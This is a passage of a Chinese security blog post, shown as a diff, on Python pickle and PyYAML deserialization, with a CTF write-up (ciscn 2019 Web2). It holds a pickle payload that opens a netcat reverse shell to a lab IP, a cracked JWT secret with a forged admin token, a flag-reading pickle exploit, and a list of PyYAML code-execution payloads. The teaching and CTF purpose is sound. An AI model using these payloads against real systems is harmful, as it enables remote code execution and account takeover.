+<span class="token keyword">class</span> <span class="token class-name">genpoc</span><span class="token punctuation">(</span><span class="token builtin">object</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">def</span> <span class="token function">__reduce__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        cmd <span class="token operator">=</span> <span class="token triple-quoted-string string">"""rm /tmp/f ; mkfifo /tmp/f;cat /tmp/f | /bin/bash -i 2>&amp;1 | nc 192.168.1.122 8888 >/tmp/f"""</span>  <span class="token comment">#要执行的命令</span>
+        <span class="token keyword">return</span> <span class="token punctuation">(</span>os<span class="token punctuation">.</span>system<span class="token punctuation">,</span> <span class="token punctuation">(</span>cmd<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token comment">#os.system("echo test >poc.txt")</span>
+
+e <span class="token operator">=</span> genpoc<span class="token punctuation">(</span><span class="token punctuation">)</span>
+poc <span class="token operator">=</span> pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>e<span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>poc<span class="token punctuation">)</span>
+pickle<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>poc<span class="token punctuation">)</span></code></pre>
+
+<p>反弹成功</p>
+<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210220165100857.png" alt="image-20210220165100857"></p>
+<h2 id="ciscn-2019-Day1-Web2"><a href="#ciscn-2019-Day1-Web2" class="headerlink" title="ciscn 2019 Day1 Web2"></a>ciscn 2019 Day1 Web2</h2><h3 id="逻辑漏洞绕过"><a href="#逻辑漏洞绕过" class="headerlink" title="逻辑漏洞绕过"></a>逻辑漏洞绕过</h3><p>请求首页，发现一个站点，在某处提示一定要买到lv6</p>
+<p>且发现页面有注册有登陆功能</p>
+<p>尝试注册账户<code>greetdawn 123</code>，登陆后购买lv6  </p>
+<p>直接寻找lv6在哪里，简单的翻了几页，发现并无lv6，且url有page传参，既然这么不好找，那就写个脚本试一试</p>
+<pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python</span>
+<span class="token comment">#coding: utf-8</span>
+
+<span class="token keyword">import</span> requests
+
+
+
+<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">2000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+	url <span class="token operator">=</span> <span class="token string">"http://192.168.1.191:8083/shop?page=&#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>
+	r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span>
+	<span class="token keyword">if</span> <span class="token string">'lv6.png'</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
+		<span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>
+		<span class="token keyword">break</span></code></pre>
+
+<p>运行找到lv6存在181页</p>
+<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210222151603695.png" alt="image-20210222151603695"></p>
+<p>请求之后发现这玩意确实是一个天价呀，买不起买不起</p>
+<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210222151706568.png" alt="image-20210222151706568"></p>
+<p>购买时，抓包尝试修改价格，将价格或折扣都修改为0，发现都会显示操作失败</p>
+<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210222151902135.png" alt="image-20210222151902135"></p>
+<p>这边尝试另一种方式，改变价格，把折扣修改到最小，发现成功有跳转，但是返回信息提示需要admin权限</p>
+<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210222152104854.png" alt="image-20210222152104854"></p>
+<h3 id="JWT伪造"><a href="#JWT伪造" class="headerlink" title="JWT伪造"></a>JWT伪造</h3><p>这边我们回到最初的请求头内，我们发现在cookie字段中存在JWT字段，既然需要admin权限，那这边我们能想到的就是使用jwt伪造</p>
+<p>首先我们先来简单了解一下什么是jwt？</p>
+<p><code>JSON Web Token (JWT)</code>是一个开放标准(RFC 7519)，它定义了一种紧凑的、自包含的方式，用于作为JSON对象在各方之间安全地传输信息。该信息可以被验证和信任，因为它是数字签名的。</p>
+<p><code>JSON Web Token</code>由三部分组成，它们之间用圆点(.)连接。这三部分分别是：HeaderPayloadSignature</p>
+<p>JWT与Session的差异</p>
+<p>相同点是，它们都是存储用户信息；然而，Session是在服务器端的，而JWT是在客户端的。Session方式存储用户信息的最大问题在于要占用大量服务器内存，增加服务器的开销。而JWT方式将用户状态分散到了客户端中，可以明显减轻服务端的内存压力。Session的状态是存储在服务器端，客户端只有session id；而Token的状态是存储在客户端。</p>
+<p>使用工具<code>https://jwt.io/</code>进行jwt加解密</p>
+<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210222153543892.png" alt="image-20210222153543892"></p>
+<p>我们发现确实这段cookie中存放了当前登录用户的用户信息</p>
+<p>那么一次来伪造admin的jwt的值</p>
+<p>首先我们需要使用<a target="_blank" rel="noopener" href="https://github.com/brendan-rius/c-jwt-cracker">c-jwt-cracker</a>来跑密钥</p>
+<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210222153723888.png" alt="image-20210222153723888"></p>
+<p>跑出来秘钥为<code>1Kun</code></p>
+<p>带入获取admin值<code>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.40on__HQ8B2-wM1ZSwax3ivRK4j54jlaXv-1JjQynjo</code></p>
+<p>修改jwt值，操作成功，获取到一个源码压缩包路径<code>/static/asd1f654e683wq/www.zip</code></p>
+<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210222154330095.png" alt="image-20210222154330095"></p>
+<h3 id="pickle反序列化"><a href="#pickle反序列化" class="headerlink" title="pickle反序列化"></a>pickle反序列化</h3><p>请求压缩包，获取到源码内容，在源码<code>Admin.py</code>中存在如下pickle反序列化代码</p>
+<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210222154718086.png" alt="image-20210222154718086"></p>
+<p>抓取到become变量页面，编写payload的脚本</p>
+<pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python</span>
+<span class="token comment">#coding: utf-8</span>
+
+<span class="token keyword">import</span> pickle
+<span class="token keyword">import</span> commands
+<span class="token keyword">import</span> urllib
+
+<span class="token keyword">class</span> <span class="token class-name">genpoc</span><span class="token punctuation">(</span><span class="token builtin">object</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">def</span> <span class="token function">__reduce__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        s <span class="token operator">=</span> <span class="token triple-quoted-string string">"""cat /flag.txt"""</span>  <span class="token comment">#要执行的命令</span>
+        <span class="token keyword">return</span> <span class="token punctuation">(</span>commands<span class="token punctuation">.</span>getoutput<span class="token punctuation">,</span> <span class="token punctuation">(</span>s<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>      <span class="token comment">#os.system("echo test >poc.txt")</span>
+
+e <span class="token operator">=</span> genpoc<span class="token punctuation">(</span><span class="token punctuation">)</span>
+poc <span class="token operator">=</span> pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>e<span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>urllib<span class="token punctuation">.</span>quote<span class="token punctuation">(</span>poc<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre>
+
+<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210222161340815.png" alt="image-20210222161340815"></p>
+<h2 id="PyYaml模块详解"><a href="#PyYaml模块详解" class="headerlink" title="PyYaml模块详解"></a>PyYaml模块详解</h2><h3 id="PyYaml基础"><a href="#PyYaml基础" class="headerlink" title="PyYaml基础"></a>PyYaml基础</h3><p>YAML是一种直观的能够被电脑识别的的数据序列化格式，容易被人类阅读，并且容易和脚本语言交互，YAML类似于XML，但是语法比XML简单得多，对于转化成数组或可以hash的数据时是很简单有效的。</p>
+<ul>
+<li>大小写敏感</li>
+<li>使用缩进表示层级关系</li>
+<li>缩进时不允许使用Tab，只允许使用空格</li>
+<li>缩进的空格数目不重要，只要相同层级的元素左对齐即可</li>
+<li>‘#’表示注释，从它开始到行尾都被忽略</li>
+</ul>
+<pre class="language-none"><code class="language-none">yaml.load() : Python PyYAML 库版本 &lt; 5.1b1
+yaml.unsafe_load() : Python PyYAML 库版本 &gt;&#x3D; 5.1b1</code></pre>
+
+
+
+<h3 id="PyYaml中的格式"><a href="#PyYaml中的格式" class="headerlink" title="PyYaml中的格式"></a>PyYaml中的格式</h3><ul>
+<li>yaml转字典</li>
+</ul>
+<pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/local/env python</span>
+
+<span class="token keyword">import</span> yaml
+
+data <span class="token operator">=</span> <span class="token triple-quoted-string string">"""
+name: greetdawn
+age: 19
+job: Player
+"""</span>
+
+a <span class="token operator">=</span> yaml<span class="token punctuation">.</span>load<span class="token punctuation">(</span>data<span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span></code></pre>
+
+<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210223093503733.png" alt="image-20210223093503733"></p>
+<ul>
+<li>yaml转列表</li>
+</ul>
+<pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/local/env python</span>
+
+<span class="token keyword">import</span> yaml
+
+data <span class="token operator">=</span> <span class="token triple-quoted-string string">"""
+- greetdawn
+- 19
+- Player
+"""</span>
+
+a <span class="token operator">=</span> yaml<span class="token punctuation">.</span>load<span class="token punctuation">(</span>data<span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span></code></pre>
+
+<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210223093654970.png" alt="image-20210223093654970"></p>
+<ul>
+<li>复合结构类型</li>
+</ul>
+<pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/local/env python</span>
+
+<span class="token keyword">import</span> yaml
+
+data <span class="token operator">=</span> <span class="token triple-quoted-string string">"""
+- name: greetdawn
+  age: 18
+  job: teacher
+- name: zhangsan
+  age: 40
+  job: player
+"""</span>
+
+a <span class="token operator">=</span> yaml<span class="token punctuation">.</span>load<span class="token punctuation">(</span>data<span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span></code></pre>
+
+<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210223094845756.png" alt="image-20210223094845756"></p>
+<ul>
+<li>纯量和标量</li>
+</ul>
+<p> 当字符串中不包含空格或者特殊字符时 , 可以不加引号 . 如果字符串中包含空格或特殊字符 , 就要使用引号 . 但需要注意 , 单引号会对特殊字符转义 , 双引号不会对特殊字符转义 .</p>
+<ul>
+<li>强制类型转换</li>
+</ul>
+<p>单个感叹号( ! )通常用于强制转换为自定义类型 , 而两个感叹号( !! )通常用于强制转换为内置类型 . </p>
+<pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/local/env python</span>
+
+<span class="token keyword">import</span> yaml
+
+data <span class="token operator">=</span> <span class="token triple-quoted-string string">"""
+ string: !!str 3.1415926
+ int: !!int "123456"
+"""</span>
+
+a <span class="token operator">=</span> yaml<span class="token punctuation">.</span>load<span class="token punctuation">(</span>data<span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span></code></pre>
+
+<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210223100750055.png" alt="image-20210223100750055"></p>
+<h3 id="PyYaml反序列化漏洞分析"><a href="#PyYaml反序列化漏洞分析" class="headerlink" title="PyYaml反序列化漏洞分析"></a>PyYaml反序列化漏洞分析</h3><ul>
+<li>pyyaml的对象转化规则</li>
+</ul>
+<p><code>%PYTHON-HOME%/Lib/site-packages/yaml/constructor.py</code></p>
+<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210223111223199.png" alt="image-20210223111223199"></p>
+<p>在源码中我们重点关注这个三个特殊的转换规则</p>
+<ul>
+<li>construct_python_object()</li>
+</ul>
+<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210223111525518.png" alt="image-20210223111525518"></p>
+<ul>
+<li>construct_python_object_apply()</li>
+</ul>
+<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210223111626157.png" alt="image-20210223111626157"></p>
+<ul>
+<li>construct_python_object_new()</li>
+</ul>
+<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210223112357209.png" alt="image-20210223112357209"></p>
+<p>我们可以清晰的发现，这三个函数都调用了函数self.make_python_instance()这个函数，让我们来一起跟踪一下该函数：</p>
+<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210223112541297.png" alt="image-20210223112541297"></p>
+<p>该函数的逻辑是调用了<code>find_python_name()</code>函数，并且执行的结果赋值给cls变量，之后又将变量cls的值作为函数名，调用该函数并将执行结果返回；</p>
+<p>这种将返回值作为函数名并调用该函数的编程方式极为危险，这里如果用户能够控制被调用函数的函数名及参数的话，那么就可以实现代码的任意执行；</p>
+<p>这边我们继续跟进<code>find_python_name()</code>函数</p>
+<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210223163820292.png" alt="image-20210223163820292"></p>
+<p>根据代码我们可以发现，假设传入变量name的参数为os.system()，首先会尝试导入os模块，然后再判断os模块中是否存在指定的对象(system),如果该对象存在就将该对象返回。</p>
+<p>当函数返回后，python会动态调用该函数，那么用户输入的恶意指令会被拼接到动态调用的函数中</p>
+<p>简单的小例子</p>
+<pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/local/env python</span>
+
+<span class="token keyword">import</span> os
+
+<span class="token keyword">class</span> <span class="token class-name">Poc1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+	<span class="token keyword">def</span> <span class="token function">shell</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
+		os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">'whoami'</span><span class="token punctuation">)</span>
+		
+obj <span class="token operator">=</span> Poc1<span class="token punctuation">(</span><span class="token punctuation">)</span>
+cls <span class="token operator">=</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> <span class="token string">"shell"</span><span class="token punctuation">)</span>
+cls<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
+
+<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210223165835716.png" alt="image-20210223165835716"></p>
+<h3 id="PyYaml反序列化漏洞利用"><a href="#PyYaml反序列化漏洞利用" class="headerlink" title="PyYaml反序列化漏洞利用"></a>PyYaml反序列化漏洞利用</h3><ul>
+<li>最基本条件，首先要让 PyYAML 能够解析序列化字符串 , 所以要使用 <code>!!python</code> 这个标签( <code>!!python/object</code> , <code>!!python/object/apply</code> , <code>!!python/object/new</code>都可以 )</li>
+<li>反序列化的过程实际上是类实例化的过程 . 只有被实例化的类中包含函数 , 且函数中包含我们的恶意代码时 , 我们的恶意代码才有可能被调用执行</li>
+<li>普通数据类型( 字符串 , 列表 , 元组 , 字典 )的反序列化过程是纯量初始化 , 赋值的过程，不会涉及到负责逻辑处理的代码块，也就不会有代码被调用执行 .</li>
+<li>因此 , 我们需要导入一个类 , 这个类存在一个包含恶意代码的函数 , 且该函数会被自动调用 . 我们将这个类序列化为字符串 , 再把这个字符串提交给 PyYAML 解析执行 .</li>
+</ul>
+<h3 id="常用payload汇总"><a href="#常用payload汇总" class="headerlink" title="常用payload汇总"></a>常用payload汇总</h3><pre class="language-python" data-language="python"><code class="language-python">!!python<span class="token operator">/</span><span class="token builtin">object</span><span class="token operator">/</span><span class="token builtin">apply</span><span class="token punctuation">:</span>subprocess<span class="token punctuation">.</span>check_output <span class="token punctuation">[</span><span class="token punctuation">[</span>calc<span class="token punctuation">.</span>exe<span class="token punctuation">]</span><span class="token punctuation">]</span>
+!!python<span class="token operator">/</span><span class="token builtin">object</span><span class="token operator">/</span><span class="token builtin">apply</span><span class="token punctuation">:</span>subprocess<span class="token punctuation">.</span>check_output <span class="token punctuation">[</span><span class="token string">"calc.exe"</span><span class="token punctuation">]</span>
+!!python<span class="token operator">/</span><span class="token builtin">object</span><span class="token operator">/</span><span class="token builtin">apply</span><span class="token punctuation">:</span>subprocess<span class="token punctuation">.</span>check_output <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token string">"calc.exe"</span><span class="token punctuation">]</span><span class="token punctuation">]</span>
+!!python<span class="token operator">/</span><span class="token builtin">object</span><span class="token operator">/</span><span class="token builtin">apply</span><span class="token punctuation">:</span>os<span class="token punctuation">.</span>system <span class="token punctuation">[</span><span class="token string">"calc.exe"</span><span class="token punctuation">]</span>
+!!python<span class="token operator">/</span><span class="token builtin">object</span><span class="token operator">/</span>new<span class="token punctuation">:</span>subprocess<span class="token punctuation">.</span>check_output <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token string">"calc.exe"</span><span class="token punctuation">]</span><span class="token punctuation">]</span>
+!!python<span class="token operator">/</span><span class="token builtin">object</span><span class="token operator">/</span>new<span class="token punctuation">:</span>os<span class="token punctuation">.</span>system <span class="token punctuation">[</span><span class="token string">"calc.exe"</span><span class="token punctuation">]</span></code></pre>
+
+
+
+
+      
+      
     </div>
+    <footer class="article-footer">
+      <ul class="article-meta">
+        <li>
+          <span class="label">Published Date:</span>
+          <a href="/2021/02/24/web-security/python-code-audit/python-unserialize/" class="article-date">
+  <time class="dt-published" datetime="2021-02-24T03:22:00.000Z" itemprop="datePublished">2021-02-24</time>
+</a>
+
+        </li>
+        
+          <li>
+            <span class="label">Category:</span>
+            
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/python%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">python代码审计</a>
   </div>
-</footer>
-</div>
-</div>
-
-<script src="/js/bootstrap.min.js"></script>
-<script src="/js/TweenMax.min.js"></script>
-<script src="/js/resizeable.min.js"></script>
-<script src="/js/joinable.js"></script>
-<script src="/js/xenon-api.min.js"></script>
-<script src="/js/xenon-toggles.min.js"></script>
-<script src="/js/xenon-custom.min.js"></script>
 
 
-<script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+          </li>
+        
+        
+          <li>
+            <span class="label">Tag:</span>
+            
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Pickle/" rel="tag">Pickle</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/PyYaml/" rel="tag">PyYaml</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">反序列化</a></li></ul>
+
+
+          </li>
+        
+        <hr/>
+      </ul>
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav" class="article-nav">
+  
+    <a href="/2021/03/17/devops-tools/win-changeip-tool/" id="article-nav-newer" class="article-nav-link-wrap newer">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          windows下ip修改小公举
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2021/02/20/web-security/shell-reverse/" id="article-nav-older" class="article-nav-link-wrap older">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">常见shell反弹姿势</div>
+    </a>
+  
+</nav>
+
+
+  
+</article>
 
 
 
-<script src="/js/lozad.min.js"></script>
+
+
+
+
+
+
+
+      </div>
+      
+    <footer id="footer" class="post-footer footer">
+      
+      <hr/>
+      <div id="footerContent" class="footer-content">
+        <p>ipsum dolor sit amet, <strong>consectetur adipiscing elit.</strong> Fusce eget urna vitae velit <em>eleifend interdum at ac nisi. In nec ligula lacus. Cum sociis natoque</em> penatibus et magnis dis parturient montes, nascetur ridiculus mus. Sed eu cursus erat, ut dapibus quam. Post</p>
+
+
+      </div>
+    </footer>
+
+      
+
+
+
+
+
+
+
+
+<script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+
+
+<script src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script>
 
 
 
   
-  <!-- 直接添加html内容即可 -->
-<!-- 可设置多行 -->
-  
-</body>
+<script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
 
+
+
+
+<script src="/js/typing.js"></script>
+
+<!--[if lt IE 9]>
+<script src="https://cdn.jsdelivr.net/npm/html5shiv@3/dist/html5shiv.min.js"></script>
+<![endif]-->
+
+
+
+
+
+
+
+    </div>
+  </body>
 </html>
